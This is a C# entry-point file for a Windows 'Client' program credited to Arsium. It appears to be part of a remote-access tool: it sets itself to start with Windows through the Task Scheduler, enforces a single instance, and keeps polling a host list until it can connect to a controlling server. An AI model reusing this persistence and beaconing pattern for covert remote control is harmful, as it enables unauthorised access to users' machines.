using Shared;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;

/*
Task.Run(someAction); 
https://devblogs.microsoft.com/pfxteam/task-run-vs-task-factory-startnew/
=

Task.Factory.StartNew(someAction, CancellationToken.None, TaskCreationOptions.DenyChildAttach, TaskScheduler.Default);

*/

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public static class Starting
    {

        [STAThread]
        public static void Main()
        {
            StartingFunction();
        }

        private static void StartingFunction() 
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Utils.OneInstance();
            Utils.StartUpTaskScheduler();
            Utils.MakeHostList();
            Host H = Utils.CheckHost();
            while (H == null)
            {
                H = Utils.CheckHost();
                Thread.Sleep(1000);
            }

            try
            {
                Thread T = new Thread(() =>
                {
                    Client C = new Client(H);
                });
                T.Start();
            }
            catch
            {
                StartingFunction();
            }
        }
    }
}
